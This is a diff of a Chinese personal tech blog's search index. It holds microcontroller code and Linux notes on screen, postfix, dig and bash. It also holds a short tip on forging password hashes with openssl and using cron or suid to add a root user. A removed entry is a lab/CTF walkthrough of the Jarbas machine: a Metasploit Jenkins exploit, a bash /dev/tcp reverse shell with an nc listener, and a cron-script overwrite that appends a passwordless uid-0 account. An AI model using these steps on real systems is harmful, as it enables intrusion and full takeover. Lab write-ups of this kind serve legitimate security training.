class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line">sbit P1_0=P1^<span class="number">0</span>;</span><br><span class="line">sbit P1_1=P1^<span class="number">1</span>;</span><br><span class="line">uchar r;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	SCON=<span class="number">0x10</span>; <span class="comment">//方式0允许输入数据</span></span><br><span class="line">	EA=<span class="number">1</span>;</span><br><span class="line">	P2=sendBuf[flag];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(P1_0==<span class="number">0</span>)&#123;</span><br><span class="line">			ES=<span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			ES=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sint</span><span class="params">()</span> interrupt 4</span>&#123;</span><br><span class="line">	P1_1=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">delay</span>(<span class="number">1</span>);</span><br><span class="line">	P1_1=<span class="number">1</span>;</span><br><span class="line">	r=SBUF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(r!=<span class="number">0xff</span>)&#123;</span><br><span class="line">		<span class="keyword">switch</span>(r)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfe</span>:flag=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfd</span>:flag=<span class="number">1</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfb</span>:flag=<span class="number">2</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xf7</span>:flag=<span class="number">3</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xef</span>:flag=<span class="number">4</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xdf</span>:flag=<span class="number">5</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xbf</span>:flag=<span class="number">6</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0x7f</span>:flag=<span class="number">7</span>;<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	P2=sendBuf[flag];</span><br><span class="line">	RI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">(uchar ms)</span></span>&#123;</span><br><span class="line">	uchar i;</span><br><span class="line">	<span class="keyword">while</span>(ms)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">123</span>;i++);</span><br><span class="line">			ms--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>openssl-手动生成linux密码</title>
+    <url>/openssl-%E6%89%8B%E5%8A%A8%E7%94%9F%E6%88%90linux%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h4 id="openssl生成linux密码">openssl生成linux密码</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="string">'12345678'</span>  <span class="comment">#-1:表示采用的是MD5加密算法。 --salt:表示使用指定盐值</span></span><br><span class="line">Password:   <span class="comment">##这里输入的是密码</span></span><br></pre></td></tr></table></figure>
+<h3 id="可以结合cron定时计划suid实现任意添加用户到etcshadow文件指定uidgid等.达到获取最高权限的目的.">可以结合cron定时计划/suid实现任意添加用户到/etc/shadow文件,指定uid,gid等.达到获取最高权限的目的.</h3>
 ]]></content>
       <categories>
-        <category>单片机</category>
+        <category>linux工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>screen-笔记</title>
+    <url>/screen-%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h4 id="常用参数">常用参数</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line">在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</span><br><span class="line">C-a ? -&gt; Help，显示简单说明</span><br><span class="line">C-a c -&gt; Create，开启新的 window</span><br><span class="line">C-a n -&gt; Next，切换到下个 window </span><br><span class="line">C-a p -&gt; Previous，前一个 window </span><br><span class="line">C-a 0..9 -&gt; 切换到第 0..9 个window</span><br><span class="line">Ctrl+a [Space] -&gt; 由視窗0循序換到視窗9</span><br><span class="line">C-a C-a -&gt; 在两个最近使用的 window 间切换</span><br><span class="line">C-a x -&gt; 锁住当前的 window，需用用户密码解锁</span><br><span class="line">C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里    每个 window 内运行的 process (无论是前台&#x2F;后台)都在继续执行，即使 logout 也不影响。 </span><br><span class="line">C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令則可回去。</span><br><span class="line">C-a w -&gt; Windows，列出已开启的 windows 有那些 </span><br><span class="line">C-a t -&gt; Time，显示当前时间，和系统的 load </span><br><span class="line">C-a K -&gt; kill window，强行关闭当前的 window</span><br></pre></td></tr></table></figure>
+<h3 id="还是tmux好用">还是TMUX好用</h3>
+]]></content>
+      <categories>
+        <category>linux工具</category>
       </categories>
   </entry>
   <entry>
@@ -3903,7 +4192,7 @@ A\overrightarrow{x}=\overrightarrow{v}
     <title>解决cencrack在线工具包的Direct错误</title>
     <url>/%E8%A7%A3%E5%86%B3cencrack%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E5%8C%85%E7%9A%84Direct%E9%94%99%E8%AF%AF/</url>
     <content><![CDATA[<p>开启此功能即可正常运行:</p>
-
+<img src="/%E8%A7%A3%E5%86%B3cencrack%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E5%8C%85%E7%9A%84Direct%E9%94%99%E8%AF%AF/directplay.png" class="" title="directplay">
 ]]></content>
       <categories>
         <category>windows工具</category>
@@ -5114,34 +5403,29 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
 ]]></content>
   </entry>
   <entry>
-    <title>screen-笔记</title>
-    <url>/screen-%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h4 id="常用参数">常用参数</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line">在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</span><br><span class="line">C-a ? -&gt; Help，显示简单说明</span><br><span class="line">C-a c -&gt; Create，开启新的 window</span><br><span class="line">C-a n -&gt; Next，切换到下个 window </span><br><span class="line">C-a p -&gt; Previous，前一个 window </span><br><span class="line">C-a 0..9 -&gt; 切换到第 0..9 个window</span><br><span class="line">Ctrl+a [Space] -&gt; 由視窗0循序換到視窗9</span><br><span class="line">C-a C-a -&gt; 在两个最近使用的 window 间切换</span><br><span class="line">C-a x -&gt; 锁住当前的 window，需用用户密码解锁</span><br><span class="line">C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里    每个 window 内运行的 process (无论是前台&#x2F;后台)都在继续执行，即使 logout 也不影响。 </span><br><span class="line">C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令則可回去。</span><br><span class="line">C-a w -&gt; Windows，列出已开启的 windows 有那些 </span><br><span class="line">C-a t -&gt; Time，显示当前时间，和系统的 load </span><br><span class="line">C-a K -&gt; kill window，强行关闭当前的 window</span><br></pre></td></tr></table></figure>
-<h3 id="还是tmux好用">还是TMUX好用</h3>
+    <title>邮件服务相关</title>
+    <url>/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<h3 id="postfix邮件服务器">postfix邮件服务器</h3>
+<p>主流服务器叫做sendmail,由于业务原因,现在的邮件服务器大都使用sendmail软件发送,但是效率很低,所以大家现在更喜欢效率更高的,开源的邮件服务器postfix,但是postfix并没有configure文件,所以需要使用命令生成make文件 <code>make makefiles 参数</code> 生成make文件,在后续指定文件生成位置,在make的时候可以选择</p>
+<h4 id="验证服务框架-cyrus-sasl">验证服务框架 cyrus-sasl</h4>
+<p>默认安装这三个包就可以让postfix支持sasl了!</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyrus-sasl</span><br><span class="line">cyrus-sasl-plain</span><br><span class="line">cyrus-sasl-devel</span><br></pre></td></tr></table></figure>
+<p>　　SASL全称Simple Authentication and Security Layer,是一种用来扩充C/S模式验证能力的机制.在Postfix可以利用SASL来判断用户是否有权使用转发服务,或是辨认谁在使用你的服务器. 　　SASL提供了一个通用的方法为基于连接的协议增加验证支持,也称作sasl框架.</p>
+<p>因为smtp(simple mail transfer protocol)十分简单,没有认证功能,所以需要sasl框架扩充. sasl 验证方式配置文件在<code>/etc/sysconfig/saslauthd</code> Debian系系统的配置文件在<code>/etc/default/saslauthd</code></p>
+<p>服务脚本叫<code>saslauthd</code> #### 鸽子笼 (dovecot) 一个支持多种协议的客户端接收协议软件 支持imap imaps pop3 pop3s 默认启用四种协议 内置sasl,且支持外置sasl框架</p>
 ]]></content>
       <categories>
-        <category>linux工具</category>
+        <category>运维</category>
       </categories>
   </entry>
   <entry>
-    <title>靶场59</title>
-    <url>/%E9%9D%B6%E5%9C%BA54/</url>
-    <content><![CDATA[<p>NMAP扫描报告 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [19:55:54] C:130</span></span><br><span class="line">$ nmap 172.17.135.54 -O -sS -A -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-29 19:55 CST</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 19:56 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.54</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)</span><br><span class="line">|_  256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">|_http-title: Jarbas - O Seu Mordomo Virtual!</span><br><span class="line">3306/tcp open  mysql   MariaDB (unauthorized)</span><br><span class="line">8080/tcp open  http    Jetty 9.4.z-SNAPSHOT</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 3.X|4.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span></span><br><span class="line"><span class="string">OS details: Linux 3.2 - 4.6</span></span><br><span class="line"><span class="string">Network Distance: 3 hops</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE (using port 256/tcp)</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   ...</span></span><br><span class="line"><span class="string">2   4.76 ms bogon (192.168.230.30)</span></span><br><span class="line"><span class="string">3   1.59 ms 172.17.135.54</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 39.08 seconds</span></span><br></pre></td></tr></table></figure> 可以看出 使用的是Jetty,在8080端口<code>http://172.17.135.54:8080</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:15:48] </span></span><br><span class="line">$ dirb http://172.17.135.54:8080 &gt; /home/divint3/ctf_chache/list.txt </span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:07:57] </span></span><br><span class="line">$ sed <span class="string">'/^==&gt;.*/!d'</span> /home/divint3/ctf_chache/list.txt</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/               </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/                  </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/         </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/            </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/   </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/classes/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/fields/  </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/name/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/package/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/class/      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/classes/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/fields/     </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/name/       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/package/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/class/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/classes/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/fields/</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:15:41] C:1</span></span><br><span class="line">$ sed -e <span class="string">'/^+.*/!d'</span> /home/divint3/ctf_chache/list.txt </span><br><span class="line">+ http://172.17.135.54:8080/error (CODE:400|SIZE:5329)</span><br><span class="line">+ http://172.17.135.54:8080/favicon.ico (CODE:200|SIZE:17542)</span><br><span class="line">+ http://172.17.135.54:8080/login (CODE:200|SIZE:5988)</span><br><span class="line">+ http://172.17.135.54:8080/<span class="built_in">logout</span> (CODE:302|SIZE:0</span><br><span class="line">+ http://172.17.135.54:8080/robots.txt (CODE:200|SIZE:71</span><br><span class="line">+ http://172.17.135.54:8080/assets/dynamic (CODE:500|SIZE:13989)</span><br></pre></td></tr></table></figure>
-<p>dirb发现robots.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># we don't want robots to click "build" links</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure></p>
-<p>先测试一下脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/jenkins_script_console) &gt; search jenkins</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                  Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                  ---------------  ----       -----  -----------</span><br><span class="line">   1   auxiliary/gather/jenkins_cred_recovery                                 normal     Yes    Jenkins Domain Credential Recovery</span><br><span class="line">   2   auxiliary/scanner/http/jenkins_command                                 normal     Yes    Jenkins-CI Unauthenticated Script-Console Scanner</span><br><span class="line">   3   auxiliary/scanner/http/jenkins_enum                                    normal     Yes    Jenkins-CI Enumeration</span><br><span class="line">   4   auxiliary/scanner/http/jenkins_login                                   normal     Yes    Jenkins-CI Login Utility</span><br><span class="line">   5   auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum                   normal     No     Jenkins Server Broadcast Enumeration</span><br><span class="line">   6   exploit/linux/misc/jenkins_java_deserialize           2015-11-18       excellent  Yes    Jenkins CLI RMI Java Deserialization Vulnerability</span><br><span class="line">   7   exploit/linux/misc/jenkins_ldap_deserialize           2016-11-16       excellent  Yes    Jenkins CLI HTTP Java Deserialization Vulnerability</span><br><span class="line">   8   exploit/linux/misc/opennms_java_serialize             2015-11-06       normal     No     OpenNMS Java Object Unserialization Remote Code Execution</span><br><span class="line">   9   exploit/multi/http/jenkins_metaprogramming            2019-01-08       excellent  Yes    Jenkins ACL Bypass and Metaprogramming RCE</span><br><span class="line">   10  exploit/multi/http/jenkins_script_console             2013-01-18       good       Yes    Jenkins-CI Script-Console Java Execution</span><br><span class="line">   11  exploit/multi/http/jenkins_xstream_deserialize        2016-02-24       excellent  Yes    Jenkins XStream Groovy classpath Deserialization Vulnerability</span><br><span class="line">   12  exploit/windows/misc/ibm_websphere_java_deserialize   2015-11-06       excellent  No     IBM WebSphere RCE Java Deserialization Vulnerability</span><br><span class="line">   13  post/multi/gather/jenkins_gather                                       normal     No     Jenkins Credential Collector</span><br></pre></td></tr></table></figure></p>
-<p>使用<code>exploit/multi/http/jenkins_metaprogramming</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 172.17.135.59 </span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 172.17.135.80</span><br><span class="line"><span class="built_in">set</span> lport 4442</span><br><span class="line"><span class="built_in">set</span> ForceExploit <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>反弹shell至本地</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.17.135.80/4442 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [18:58:07] C:1</span></span><br><span class="line">$ nc -lvp 4442</span><br><span class="line">listening on [any] 4442 ...</span><br><span class="line">connect to [172.17.135.80] from bogon [172.17.135.59] 55308</span><br></pre></td></tr></table></figure>
-<p>尝试suid文件提权, 没有特定文件</p>
-<p>发现crontab <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
-<p>修改目标脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"sed -i '/^root.*/a divint3::0:0:root:/root:/bin/bash'"</span> &gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure></p>
-<p>等待一会 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">su divint3</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">[root@jarbas /]<span class="comment"># cd /root</span></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">Hey!</span><br><span class="line"></span><br><span class="line">Congratulations! You got it! I always knew you could <span class="keyword">do</span> it!</span><br><span class="line">This challenge was very easy, huh? =)</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> appreciating this machine.</span><br><span class="line"></span><br><span class="line">@tiagotvrs </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:997:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br><span class="line">jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure></p>
+    <title>Dns服务相关</title>
+    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
+<p>显示域名详细信息,所有记录 以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令 <code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code> 全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析 <code>dig -x ip地址 @DNS服务器</code></p>
 ]]></content>
       <categories>
-        <category>writeup</category>
+        <category>运维</category>
       </categories>
   </entry>
   <entry>
@@ -5286,406 +5570,122 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
       </categories>
   </entry>
   <entry>
-    <title>Linux-bash</title>
-    <url>/Linux-bash/</url>
-    <content><![CDATA[<h1 id="bash">Bash</h1>
-<h2 id="shell是一种弱类型的编程语言">shell是一种弱类型的编程语言</h2>
-<h3 id="配置文件">配置文件</h3>
-<p><strong>profile</strong>：定义环境变量，运行程序或者脚本，只在用户登录时才会运行该配置文件</p>
-<p><strong>bashrc</strong>：设置本地变量，定义命令别名</p>
-<a id="more"></a>
-<h4 id="登录式shell配置文件及次序">登录式shell，配置文件及次序</h4>
-<p><code>/etc/profile --&gt; /etc/profile.d/*.sh --&gt; ~/.bash_profile --&gt; ~/.bashrc --&gt; /etc/bashrc</code></p>
-<h4 id="非登录式shell配置文件及次序">非登录式shell，配置文件及次序</h4>
-<p><code>~/.bashrc --&gt; /etc/bashrc --&gt; /etc/profile.d/*.sh</code></p>
-<hr />
-<h2 id="linux变量">linux变量</h2>
-<p><strong>变量赋值</strong>：变量名=变量值</p>
-<p><strong>撤销变量</strong>：unset 变量名</p>
-<p><strong>引用变量</strong>：$变量名</p>
-<h3 id="bash变量类型">bash变量类型</h3>
-<ol type="1">
-<li><strong>环境变量</strong>：作用域为当前shell进程及其子进程
-<ol type="1">
-<li>查看环境变量
-<ol type="1">
-<li>printenv</li>
-<li>env</li>
-<li>export</li>
-</ol></li>
-</ol></li>
-<li><strong>本地变量</strong>：作用域为整个bash进程
-<ol type="1">
-<li>查看本地变量
-<ol type="1">
-<li>set</li>
-</ol></li>
-</ol></li>
-<li><strong>特殊变量</strong>
-<ol type="1">
-<li><code>$?</code>
-<ol type="1">
-<li>返回上一个命令执行状态返回值，值为0代表程序正确执行，非零都为错误执行</li>
-</ol></li>
-<li><code>$#</code>
-<ol type="1">
-<li>返回传入参数个数</li>
-</ol></li>
-<li><code>$@</code>
-<ol type="1">
-<li>返回参数内容，多个参数返回列表</li>
-</ol></li>
-<li><code>$*</code>
-<ol type="1">
-<li>返回所有参数</li>
-</ol></li>
-<li><code>$RANDOM</code>
-<ol type="1">
-<li>生成随机数</li>
-</ol></li>
-<li><code>$$</code>
-<ol type="1">
-<li>返回当前进程id</li>
-</ol></li>
-<li><code>$!</code>
-<ol type="1">
-<li>后台运行的最后一个进程的id号</li>
-</ol></li>
-</ol></li>
-<li><strong>位置变量</strong>
-<ol type="1">
-<li><code>$0</code>
-<ol type="1">
-<li>脚本名，带上所有引用路径</li>
-</ol></li>
-<li><code>$1-9</code>
-<ol type="1">
-<li>参数</li>
-</ol></li>
-<li>注意，<code>$10</code> 不能获取第十个参数，获取第十个参数需要​<code>${10}</code>。当n&gt;=10时，需要使用<code>${n}</code>来获取参数</li>
-</ol></li>
-</ol>
-<p>shift命令，踢出参数</p>
-<hr />
-<h3 id="数组">数组</h3>
-<ol type="1">
-<li>声明数组
-<ol type="1">
-<li><code>declare -a 数组名</code></li>
-</ol></li>
-<li>数组赋值
-<ol type="1">
-<li>数组名={元素1 元素2 ……}
-<ol type="1">
-<li>human={jack tom divint3}</li>
-</ol></li>
-<li>数组名={[元素位置1]=元素值1 [元素位置]2=元素2 ……}
-<ol type="1">
-<li>human={[0]=jack [1]=tom [6]=Divint3}</li>
-</ol></li>
-</ol></li>
-</ol>
-<h2 id="管道与重定向">管道与重定向</h2>
-<h3 id="输入输出重定向">输入输出重定向</h3>
-<ol type="1">
-<li>标准输入：代码为 0 ；或称为 stdin ；使用的方式为 &lt;</li>
-<li>标准输出：代码为 1 ；或称为 stdout；使用的方式为 1&gt;</li>
-<li>错误输出：代码为 2 ；或称为 stderr；使用的方式为 2&gt;</li>
-</ol>
-<p>输入重定向,一般输入到一个程序中:<code>&lt;</code> 输出通定向:<code>&gt;</code> 追加输出重定向:<code>&gt;&gt;</code> 在此处生成文档 Here Document:<code>&lt;&lt;</code></p>
-<p>例如: 不指定输出位置,则输出到屏幕:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Divint3:~<span class="comment"># cat &lt;&lt; EOF</span></span><br><span class="line">&gt; The First Line.</span><br><span class="line">&gt; The Second Line.</span><br><span class="line">&gt; EOF</span><br><span class="line">The First Line.</span><br><span class="line">The Second Line.</span><br></pre></td></tr></table></figure>
